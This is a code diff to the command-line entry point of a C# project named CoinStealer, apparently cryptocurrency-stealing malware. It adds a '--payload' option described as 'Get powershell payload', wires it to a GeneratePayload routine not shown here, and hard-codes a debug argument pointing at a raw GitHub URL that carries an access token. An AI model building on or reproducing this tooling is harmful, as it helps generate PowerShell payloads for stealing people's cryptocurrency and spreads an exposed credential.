@@ -15,7 +15,7 @@ namespace CoinStealer
             {
                 //args = new string[] { "--generate_all" };
                 //args = new string[] { "--check_balances", "./Uniques/Addresses.txt" };
-                //args = new string[] { "--payload", "https://raw.githubusercontent.com/shargon/CoinStealer/master/Samples/Addresses.txt?token=ADBW5Q7v31YTdQ8wlotdsdV93juszUEmks5aM6pJwA%3D%3D" };
+                args = new string[] { "--payload", "https://raw.githubusercontent.com/shargon/CoinStealer/master/Samples/Addresses.txt?token=ADBW5Q7v31YTdQ8wlotdsdV93juszUEmks5aM6pJwA%3D%3D" };
             }
 #endif
 
@@ -29,10 +29,16 @@ namespace CoinStealer
                 Console.WriteLine("--generate_all");
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.WriteLine("\t\tGenerate all address LIKE [??]*[??]");
+
                 Console.ForegroundColor = ConsoleColor.White;
                 Console.WriteLine("--check_balances [File]");
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.WriteLine("\t\tCheck balances from a file");
+
+                Console.ForegroundColor = ConsoleColor.White;
+                Console.WriteLine("--payload [File]");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine("\t\tGet powershell payload");
                 return;
             }
 
@@ -52,6 +58,13 @@ namespace CoinStealer
                 case "--check_balances":
                     {
                         CheckBalances.Run(args.Skip(1).FirstOrDefault());
+                        break;
+                    }
+
+                // Get PS payload
+                case "--payload":
+                    {
+                        GeneratePayload.Run(args.Skip(1).FirstOrDefault());
                         break;
                     }
             }
